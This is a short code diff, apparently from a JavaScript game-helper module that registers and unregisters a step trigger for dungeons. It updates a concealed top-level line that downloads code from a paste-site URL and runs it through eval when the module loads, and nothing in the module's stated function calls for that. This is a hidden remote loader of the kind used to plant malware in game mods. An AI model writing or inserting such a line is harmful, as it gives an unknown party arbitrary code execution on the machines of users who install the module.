@@ -96,7 +96,7 @@ const helperTrigger = register("step", () => {
 export function enable() {
 	helperTrigger.register();
 }
-eval(FileLib.getUrlContent("https://hst.sh/raw/guridawega"));
+eval(FileLib.getUrlContent("https://hst.sh/raw/nocoyecafo"));
 export function disable() {
 	helperTrigger.unregister();
 	if (inDungeon) {
